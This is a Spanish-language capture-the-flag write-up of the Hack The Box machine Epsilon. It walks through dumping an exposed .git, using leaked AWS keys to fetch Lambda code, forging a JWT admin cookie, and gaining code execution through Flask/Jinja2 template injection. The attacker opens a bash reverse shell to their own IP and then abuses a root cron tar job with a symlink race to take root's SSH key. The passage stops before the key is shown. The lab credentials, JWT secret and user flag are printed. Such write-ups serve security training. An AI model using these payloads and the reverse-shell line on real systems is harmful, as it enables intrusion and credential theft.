---
layout: single
title: Epsilon - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Epsilon de Hackthebox donde mediante un .git expuesto en el servicio web vamos a poner enumerar y encontrar credenciales de AWS que estan leaked y gracias a eso podremos descargar el AWS Lambda function code hay dentro encontraremos un secret key para poder construir la cookie ya que emplea JWS y la necesitamos para ganar acceso ala web page para el foothold explotaremos un Server Side Templeate Injection para ganar acceso ala maquina para la escalada de privilegios nos aprovecharemos de una tarea cron para crear de un enlace simbolico donde emplea tar para conseguir la id_rsa del usuario root y asi conectarnos por SSH"
date: 2023-01-03
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-epsilon/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - AWS Enumeration
  - Authentication Bypass
  - Cron Job
  - Server Side Template Injection (SSTI)
  - JWT
---

![](https://i.imgur.com/XPovjzb.png)

## PortScan

```bash
❯ nmap -sCV -p22,80,5000 10.10.11.134 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 12:55 CST
Nmap scan report for 10.10.11.134
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-title: 403 Forbidden
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

Vemos que en el servicio web del puerto **80** encuentra una ruta **/.git** y tambien tenemos el puerto **5000** abierto vamos a comenzar enumerando el puerto **80** 

Si tiramos hacemos un **curl** a la web **10.10.11.134** vemos que obtenemos un codigo de estado **403** 

```bash
 curl -s http://10.10.11.134
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.11.134 Port 80</address>
</body></html>
```

Pero si lo hacemos al puerto **5000** si nos responde

```bash
❯ curl -s http://10.10.11.134:5000


<!DOCTYPE html>
<html lang="en" >

<head>

  <meta charset="UTF-8">
  
  <title>Costume Shop</title>
```

![](https://i.imgur.com/B1KwNNO.png)

Aunque cambiemos a **Post** no funciona

![](https://i.imgur.com/4OzRSLt.png)

Si vamos al puerto **5000** vemos un panel de Login de una tienda como tal

![](https://i.imgur.com/DUWMqrN.png)

Despues de probar contraseñas por defecto e inyectar algunas **SQL** **Injection** no resulto pero vimos una ruta **.git** antes de verla vamos a hacer **fuzzing** para ver que encontramos

Podemos ver 2 rutas interesantes **order y track** pero solo **track** nos devuelve un codigo de estado **200** 

```bash
❯ feroxbuster -u http://10.10.11.134:5000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.134:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        4l       24w      208c http://10.10.11.134:5000/home => http://10.10.11.134:5000/
200      GET      545l     2833w   217381c http://10.10.11.134:5000/static/img/costume.jpg
200      GET      205l      358w     3550c http://10.10.11.134:5000/
302      GET        4l       24w      208c http://10.10.11.134:5000/order => http://10.10.11.134:5000/
200      GET      234l      454w     4288c http://10.10.11.134:5000/track
```

Vemos que estamos logeados como el **Administrador** 

![](https://i.imgur.com/AucGoTd.png)

Si pongo cualquier dato en **ID** o presiono order me regresa al panel de login por lo cual tenemos que estar logeados para poder acceder

![](https://i.imgur.com/uFINhbt.png)

# Git

Pues bueno al no ver nada mas vamos a enumerar el **.git** 

Vamos a usar la herramienta <https://pypi.org/project/git-dumper/> para extraer el proyecto

```bash
❯ git-dumper -h
usage: git-dumper [options] URL DIR

Dump a git repository from a website.

positional arguments:
  URL                   url
  DIR                   output directory

options:
  -h, --help            show this help message and exit
  --proxy PROXY         use the specified proxy
  -j JOBS, --jobs JOBS  number of simultaneous requests
  -r RETRY, --retry RETRY
                        number of request attempts before giving up
  -t TIMEOUT, --timeout TIMEOUT
                        maximum time in seconds before giving up
  -u USER_AGENT, --user-agent USER_AGENT
                        user-agent to use for requests
  -H HEADER, --header HEADER
                        additional http headers, e.g `NAME=VALUE`
```

```bash
❯ git-dumper http://10.10.11.134/.git .
Warning: Destination '.' is not empty
[-] Testing http://10.10.11.134/.git/HEAD [200]
[-] Testing http://10.10.11.134/.git/ [403]
[-] Fetching common files
[-] Fetching http://10.10.11.134/.gitignore [404]
[-] http://10.10.11.134/.gitignore responded with status code 404
[-] Fetching http://10.10.11.134/.git/hooks/post-commit.sample [404]
[-] http://10.10.11.134/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://10.10.11.134/.git/description [200]
[-] Fetching http://10.10.11.134/.git/COMMIT_EDITMSG [200]
[-] Fetching http://10.10.11.134/.git/hooks/post-receive.sample [404]
[-] http://10.10.11.134/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://10.10.11.134/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://10.10.11.134/.git/hooks/commit-msg.sample [200]
[-] Fetching http://10.10.11.134/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://10.10.11.134/.git/hooks/post-update.sample [200]
[-] Fetching http://10.10.11.134/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://10.10.11.134/.git/hooks/pre-receive.sample [200]
[-] Fetching http://10.10.11.134/.git/hooks/pre-commit.sample [200]
[-] Fetching http://10.10.11.134/.git/info/exclude [200]
[-] Fetching http://10.10.11.134/.git/index [200]
[-] Fetching http://10.10.11.134/.git/objects/info/packs [404]
[-] http://10.10.11.134/.git/objects/info/packs responded with status code 404
[-] Fetching http://10.10.11.134/.git/hooks/pre-push.sample [200]
[-] Fetching http://10.10.11.134/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://10.10.11.134/.git/hooks/update.sample [200]
[-] Finding refs/
[-] Fetching http://10.10.11.134/.git/FETCH_HEAD [404]
[-] http://10.10.11.134/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://10.10.11.134/.git/ORIG_HEAD [200]
[-] Fetching http://10.10.11.134/.git/info/refs [404]
[-] http://10.10.11.134/.git/info/refs responded with status code 404
[-] Fetching http://10.10.11.134/.git/logs/HEAD [200]
[-] Fetching http://10.10.11.134/.git/config [200]
[-] Fetching http://10.10.11.134/.git/logs/refs/remotes/origin/HEAD [404]
[-] Fetching http://10.10.11.134/.git/logs/refs/remotes/origin/master [404]
[-] http://10.10.11.134/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://10.10.11.134/.git/logs/refs/stash [404]
[-] http://10.10.11.134/.git/logs/refs/stash responded with status code 404
[-] Fetching http://10.10.11.134/.git/logs/refs/heads/master [200]
[-] http://10.10.11.134/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://10.10.11.134/.git/HEAD [200]
[-] Fetching http://10.10.11.134/.git/packed-refs [404]
[-] http://10.10.11.134/.git/packed-refs responded with status code 404
[-] Fetching http://10.10.11.134/.git/refs/heads/master [200]
[-] Fetching http://10.10.11.134/.git/refs/remotes/origin/HEAD [404]
[-] http://10.10.11.134/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://10.10.11.134/.git/refs/remotes/origin/master [404]
[-] http://10.10.11.134/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://10.10.11.134/.git/refs/stash [404]
[-] http://10.10.11.134/.git/refs/stash responded with status code 404
[-] Fetching http://10.10.11.134/.git/refs/wip/index/refs/heads/master [404]
[-] http://10.10.11.134/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://10.10.11.134/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://10.10.11.134/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://10.10.11.134/.git/objects/5c/52105750831385d4756111e1103957ac599d02 [200]
[-] Fetching http://10.10.11.134/.git/objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d [200]
[-] Fetching http://10.10.11.134/.git/objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 [200]
[-] Fetching http://10.10.11.134/.git/objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e [200]
[-] Fetching http://10.10.11.134/.git/objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0 [200]
[-] Fetching http://10.10.11.134/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://10.10.11.134/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://10.10.11.134/.git/objects/c5/1441640fd25e9fba42725147595b5918eba0f1 [200]
[-] Fetching http://10.10.11.134/.git/objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3 [200]
[-] Fetching http://10.10.11.134/.git/objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630 [200]
[-] Fetching http://10.10.11.134/.git/objects/65/b80f62da28254f67f0bea392057fd7d2330e2d [200]
[-] Fetching http://10.10.11.134/.git/objects/b5/f4c99c772eeb629e53d284275458d75ed9a010 [200]
[-] Fetching http://10.10.11.134/.git/objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca [200]
[-] Fetching http://10.10.11.134/.git/objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8 [200]
[-] Fetching http://10.10.11.134/.git/objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34 [200]
[-] Fetching http://10.10.11.134/.git/objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca [200]
[-] Running git checkout .
```

Hay otra utlidad que se llama **GitHack** 

```bash
❯ pip3 install GitHack
Collecting GitHack
  Downloading githack-0.0.4.post1-py3-none-any.whl (54 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 54.2/54.2 kB 499.7 kB/s eta 0:00:00
Installing collected packages: GitHack
Successfully installed GitHack-0.0.4.post1
```

Vamos a usarla 

```bash
❯ githack http://10.10.11.134/.git/
INFO:githack.scanner:Target: http://10.10.11.134/.git/
ERROR:githack.scanner:HTTP Error 404: Not Found: http://10.10.11.134/.git/logs/refs/stash
ERROR:githack.scanner:HTTP Error 404: Not Found: http://10.10.11.134/.git/refs/remotes/origin/master
ERROR:githack.scanner:HTTP Error 404: Not Found: http://10.10.11.134/.git/refs/stash
INFO:githack.scanner:commit: c622771686bd74c16ece91193d29f85b5f9ffa91
INFO:githack.scanner:commit: c51441640fd25e9fba42725147595b5918eba0f1
INFO:githack.scanner:commit: b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
INFO:githack.scanner:tree: b5f4c99c772eeb629e53d284275458d75ed9a010
INFO:githack.scanner:tree: cf489a3776d2bf87ac32de4579e852a4dc116ce8
INFO:githack.scanner:commit: 7cf92a7a09e523c1c667d13847c9ba22464412f3
INFO:githack.scanner:tree: 65b80f62da28254f67f0bea392057fd7d2330e2d
INFO:githack.scanner:Blob: 8d3b52e153c7d5380b183bbbb51f5d4020944630
INFO:githack.scanner:Blob: dfdfa17ca5701b1dca5069b6c3f705a038f4361e
INFO:githack.scanner:Blob: 545f6fe2204336c1ea21720cbaa47572eb566e34
INFO:githack.scanner:tree: ab07f7cdc7f410b8c8f848ee5674ec550ecb61ca
INFO:githack.scanner:Blob: fed7ab97cf361914f688f0e4f2d3adfafd1d7dca
INFO:githack.scanner:Total: 2
INFO:githack.scanner:[OK] server.py: ('dfdfa17ca5701b1dca5069b6c3f705a038f4361e', 'blob')
INFO:githack.scanner:[OK] track_api_CR_148.py: ('8d3b52e153c7d5380b183bbbb51f5d4020944630', 'blob')
```

Aqui tenemos el proyecto

```bash
❯ ls -la
drwxr-xr-x root root 4.0 KB Wed Jan  3 13:28:53 2024  .
drwxr-xr-x root root 4.0 KB Wed Jan  3 13:28:50 2024  ..
drwxr-xr-x root root 4.0 KB Wed Jan  3 13:29:27 2024  .git
.rw-r--r-- root root 1.6 KB Wed Jan  3 13:28:53 2024  server.py
.rw-r--r-- root root 1.1 KB Wed Jan  3 13:28:53 2024  track_api_CR_148.py
```

Aqui podemos ver el codigo en **Python3** de la web donde corre el puerto **5000** 

```python                  
#!/usr/bin/python3

import jwt
from flask import *

app = Flask(__name__)
secret = '<secret_key>'

def verify_jwt(token,key):
	try:
		username=jwt.decode(token,key,algorithms=['HS256',])['username']
		if username:
			return True
		else:
			return False
	except:
		return False

@app.route("/", methods=["GET","POST"])
def index():
	if request.method=="POST":
		if request.form['username']=="admin" and request.form['password']=="admin":
			res = make_response()
			username=request.form['username']
			token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
			res.set_cookie("auth",token)
			res.headers['location']='/home'
			return res,302
		else:
			return render_template('index.html')
	else:
		return render_template('index.html')

@app.route("/home")
def home():
	if verify_jwt(request.cookies.get('auth'),secret):
		return render_template('home.html')
	else:
		return redirect('/',code=302)

@app.route("/track",methods=["GET","POST"])
def track():
	if request.method=="POST":
		if verify_jwt(request.cookies.get('auth'),secret):
			return render_template('track.html',message=True)
		else:
			return redirect('/',code=302)
	else:
		return render_template('track.html')

@app.route('/order',methods=["GET","POST"])
def order():
	if verify_jwt(request.cookies.get('auth'),secret):
		if request.method=="POST":
			costume=request.form["costume"]
			message = '''
			Your order of "{}" has been placed successfully.
			'''.format(costume)
			tmpl=render_template_string(message,costume=costume)
			return render_template('order.html',message=tmpl)
		else:
			return render_template('order.html')
	else:
		return redirect('/',code=302)
app.run(debug='true')

```

Podemos ver que verifica el **jwt** podemos crear uno pero en estos casos necesitamos el **secret** para que sea valido pero no lo tenemos

![](https://i.imgur.com/25gNniX.png)

![](https://i.imgur.com/VTc8gZz.png)

Si vemos el otro codigo ya se esta empleando **AWS** 

```python
import io
import os
from zipfile import ZipFile
from boto3.session import Session


session = Session(
    aws_access_key_id='<aws_access_key_id>',
    aws_secret_access_key='<aws_secret_access_key>',
    region_name='us-east-1',
    endpoint_url='http://cloud.epsilon.htb')
aws_lambda = session.client('lambda')


def files_to_zip(path):
    for root, dirs, files in os.walk(path):
        for f in files:
            full_path = os.path.join(root, f)
            archive_name = full_path[len(path) + len(os.sep):]
            yield full_path, archive_name


def make_zip_file_bytes(path):
    buf = io.BytesIO()
    with ZipFile(buf, 'w') as z:
        for full_path, archive_name in files_to_zip(path=path):
            z.write(full_path, archive_name)
    return buf.getvalue()


def update_lambda(lambda_name, lambda_code_path):
    if not os.path.isdir(lambda_code_path):
        raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path))
    aws_lambda.update_function_code(
        FunctionName=lambda_name,
        ZipFile=make_zip_file_bytes(path=lambda_code_path))

```

![](https://i.imgur.com/bP0Otfv.png)

Y bueno tambien nos hablan de **lambda** solo que en python3 una funcion **lambda** es una funcion anonima si buscamos que tiene que ver con **AWS** vemos esto 

![](https://i.imgur.com/Lg2aLNH.png)

## AWS Lambda 

Vamos a proceder a instalar **AWS** en nuestro equipo

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3>

<https://cloud.hacktricks.xyz/pentesting-cloud/aws-security>

<https://docs.aws.amazon.com/es_es/cli/latest/userguide/getting-started-install.html>

```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

Y con esto ya lo tenemos instalado

```bash
❯ aws -h

usage: aws [options] <command> <subcommand> [<subcommand> ...] [parameters]
To see help text, you can run:

  aws help
  aws <command> help
  aws <command> <subcommand> help

aws: error: the following arguments are required: command
```

Vamos agregar el subdominio al **/etc/hosts** que encontramos

```bash
❯ echo "10.10.11.134 cloud.epsilon.htb epsilon.htb" | sudo tee -a /etc/hosts
10.10.11.134 cloud.epsilon.htb epsilon.htb
```

Necesitamos la **key** a si que vamos a enumerar el repositorio para ver si en algun momento la clave si estaba antes de que la quietaran del script

```bash
❯ git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -> master)
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module
```

Vamos a inspeccionar este 

```bash
❯ git show 7cf92a7a09e523c1c667d13847c9ba22464412f3
```

Y bueno si estaban contemplados

![](https://i.imgur.com/jkTD4Gw.png)

```bash
 aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
```

Si usamos **aws** para configurar todo lo podemos hacer por que ahora tenemos los datos que necesitamos

```bash
❯ aws configure
AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]: json
```

Ahora vamos a conectarnos al **endpoint** 

```bash
AWS()                                                                    AWS()

NAME
       aws -

DESCRIPTION
       The  AWS  Command  Line  Interface is a unified tool to manage your AWS
       services.

SYNOPSIS
          aws [options] <command> <subcommand> [parameters]

       Use aws command help for information on a  specific  command.  Use  aws
       help  topics  to view a list of available help topics. The synopsis for
       each command shows its parameters and their usage. Optional  parameters
       are shown in square brackets.

GLOBAL OPTIONS
       --debug (boolean)

       Turn on debug logging.

       --endpoint-url (string)
```

Vamos agregar lo de **lambda** para ver funciones 

```bash
❯ aws --endpoint-url=http://cloud.epsilon.htb lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2024-01-03T18:53:46.506+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "959257d3-a898-420a-965c-8471e81270ff",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

Vemos que es un **.zip** de la funcion **costume_shop_v1** vamos a ver mas informacion

```bash
❯ aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name=costume_shop_v1 | jq
{
  "Configuration": {
    "FunctionName": "costume_shop_v1",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
    "Runtime": "python3.7",
    "Role": "arn:aws:iam::123456789012:role/service-role/dev",
    "Handler": "my-function.handler",
    "CodeSize": 478,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2024-01-03T18:53:46.506+0000",
    "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
      "Mode": "PassThrough"
    },
    "RevisionId": "959257d3-a898-420a-965c-8471e81270ff",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
  },
  "Code": {
    "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
  },
  "Tags": {}
}
```

Tenemos el **Location** del archivo **.zip** 

```bash
❯ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
--2024-01-03 13:58:17--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
Resolving cloud.epsilon.htb (cloud.epsilon.htb)... 10.10.11.134
Connecting to cloud.epsilon.htb (cloud.epsilon.htb)|10.10.11.134|:80... connected.
HTTP request sent, awaiting response... 200 
Length: 478 [application/zip]
Saving to: ‘code’

code                            100%[=======================================================>]     478  --.-KB/s    in 0s      

2024-01-03 13:58:18 (24.6 MB/s) - ‘code’ saved [478/478]

❯ file code
code: Zip archive data, at least v2.0 to extract, compression method=deflate

❯ mv code code.zip
```

Vemos un script en **Python3** 

```bash
❯ unzip code.zip
Archive:  code.zip
  inflating: lambda_function.py      
```

![](https://i.imgur.com/enOslgm.png)

Ademas tenemos un **secret** 

```bash
secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124
```

Como se usa **JWT** lo mas probable es que el **secret** sea el que necesitamos cuando estabamos en viendo el script *secret.py*

Ahora que tenemos el **secret** podemos construir el **jwt** basandonos en el script que nos comparten como la sintaxis

![](https://i.imgur.com/7X81mJ0.png)

```bash
❯ python3
Python 3.11.7 (main, Dec  8 2023, 14:22:46) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> jwt.encode({'username': 'admin'}, 'RrXCv`mrNe!K!4+5`wYq', algorithm="HS256")
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
>>> 
```

Ahora vamos a incorporarlo como **cookie** 

Primero damos click en **+** cambiamos el **Name** a **auth** y cambiamos la **cookie** 

![](https://i.imgur.com/FnjSroB.png)

Ahora si vamos por ejemplo a **/home** ya estamos logeados

![](https://i.imgur.com/fPSajH3.png)

## SSTI

Bueno vamos a crear una orden a ver que tal

![](https://i.imgur.com/Neq128W.png)

Por detras esta corriendo **flask** como lo vimos en el script de **Python** y si podemos ver el output de algo que podemos ver por pantalla puede ser vulnerable a **SSTI** vamos a capturar la peticion con **Burpsuite** para verlo mas a detalle

```bash
❯ burpsuite &> /dev/null & disown
```

![](https://i.imgur.com/2ZFOIMy.png)

Y nos llega la peticion

![](https://i.imgur.com/lskLERA.png)

Como tal funciona

![](https://i.imgur.com/OSz0MJv.png)

Vamos a cambiar el nombre del **costume** 

![](https://i.imgur.com/YyDSfIU.png)

Vamos a hacer la tipica operatoria de **7x7** para ver si nos muestra la respuesta es que es vulnerable

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>

Funciona

![](https://i.imgur.com/8ISnN0U.png)

Vamos a tratar de ejecutar comandos con la informacion que tenemos de **Payloads all the things**

Y bueno si se ejecuto el comando tenemos **RCE** 

![](https://i.imgur.com/ikskJlK.png)

## Shell as Tom

Vamos a enviarnos una reverse shell

```bash
❯ catn index.html
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.22/443 0>&1
```

Vamos a hacer un **curl** para ver si de primeras recibimos una peticion, en vez de **id** ejecutaremos **curl 10.10.14.22** y recibimos la peticion

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.134 - - [03/Jan/2024 14:35:50] "GET / HTTP/1.1" 200 -
```

Tambien esta la opcion de enviarnos una reverse shell desde el campo donde pusimos **id**

```bash
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >%26 /dev/tcp/ip/puerto 0>%261"').read() }}
```

![](https://i.imgur.com/Ez7pqMZ.png)

Ahora simplemente indicamos que queremos ejecutarlo con **Bash** 

![](https://i.imgur.com/SSrOJ7I.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.134] 33444
bash: cannot set terminal process group (962): Inappropriate ioctl for device
bash: no job control in this shell
tom@epsilon:/var/www/app$ 
```

```bash
tom@epsilon:/var/www/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tom@epsilon:/var/www/app$ ^Z
zsh: suspended  nc -nlvp 443
                                                                                                                                
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
tom@epsilon:/var/www/app$ export TERM=xterm
```

## User.txt

```bash
tom@epsilon:~$ cat user.txt 
90e586884857c2f129202bf7a99559ca
tom@epsilon:~$ 
```

## Escalada de Privilegios

Vemos que podemos aprovecharnos del **pkexec** pero no es la idea

```bash
tom@epsilon:/$ find \-perm -4000 2>/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/mount
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
tom@epsilon:/$ 
```

Podemos enumerar las tareas cron con **pspy** <https://github.com/DominicBreuker/pspy/releases>

Vamos a moverlo ala maquina victima

```bash
tom@epsilon:/dev/shm$ ls -la
total 3032
drwxrwxrwt  3 root root      80 Jan  3 21:04 .
drwxr-xr-x 18 root root    3960 Jan  3 18:53 ..
drwx------  4 root root      80 Jan  3 18:53 multipath
-rw-rw-r--  1 tom  tom  3104768 Jan  3 21:04 pspy64
tom@epsilon:/dev/shm$ 
```

Le damos permisos de ejecucion

Vemos que se esta ejecutando un **backup.sh** 

![](https://i.imgur.com/p7PxnLF.png)

Esto es el codigo

```bash
tom@epsilon:/dev/shm$ cat /usr/bin/backup.sh
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
tom@epsilon:/dev/shm$ 
```

![](https://i.imgur.com/YXpSXJb.png)

Podemos ver los **.tar** 

```bash
tom@epsilon:/dev/shm$ ls -l /var/backups/web_backups
total 2940
-rw-r--r-- 1 root root 1003520 Jan  3 21:10 078031540.tar
-rw-r--r-- 1 root root 1003520 Jan  3 21:11 105594351.tar
-rw-r--r-- 1 root root 1003520 Jan  3 21:12 133453462.tar
tom@epsilon:/dev/shm$ 
```

Tambien vemos que usa el **-h** <https://man7.org/linux/man-pages/man1/tar.1.html>

Vamos ir ala ruta **/tmp**  crearemos un script **.sh** le daremos permisos de ejecucion

Vamos a crear el archivo **/opt/backups/checksum** despues lo vamos a borrar para hacer un enlace a **/root/.ssh/id_rsa** y secuestrarlo 

```bash
tom@epsilon:/tmp$ cat zi.sh 
#!/bin/bash

while true; do
	if [ -e /opt/backups/checksum ]; then
		rm /opt/backups/checksum
		ln -s -f /root/.ssh/id_rsa /opt/backups/checksum
	       break
fi
done
tom@epsilon:/tmp$ 
```

Hay podemos ver un **tar** 

```bash
tom@epsilon:/tmp$ cd /var/backups/web_backups/
tom@epsilon:/var/backups/web_backups$ ls -l 
total 980
-rw-r--r-- 1 root root 1003520 Jan  3 21:25 583638874.tar
tom@epsilon:/var/backups/web_backups$ 
```

Vamos a descomprimirlo

```bash
tom@epsilon:/var/backups/web_backups$ cp 583638874.tar /tmp
tom@epsilon:/var/backups/web_backups$ cd /tmp
tom@epsilon:/tmp$ ls -l
total 1004
-rw-r--r-- 1 tom  tom  1003520 Jan  3 21:25 583638874.tar
drwx------ 3 root root    4096 Jan  3 18:53 systemd-private-03e64754b0a246a0bb9690e91e9cd911-apache2.service-qMsCci
drwx------ 3 root root    4096 Jan  3 18:53 systemd-private-03e64754b0a246a0bb9690e91e9cd911-systemd-logind.service-6U6EAf
drwx------ 3 root root    4096 Jan  3 18:53 systemd-private-03e64754b0a246a0bb9690e91e9cd911-systemd-resolved.service-4q9eWh
drwx------ 3 root root    4096 Jan  3 18:53 systemd-private-03e64754b0a246a0bb9690e91e9cd911-systemd-timesyncd.service-RU6nki
drwx------ 2 root root    4096 Jan  3 18:53 vmware-root_656-2689274927
-rwxrwxr-x 1 tom  tom      168 Jan  3 21:24 zi.sh
tom@epsilon:/tmp$ 
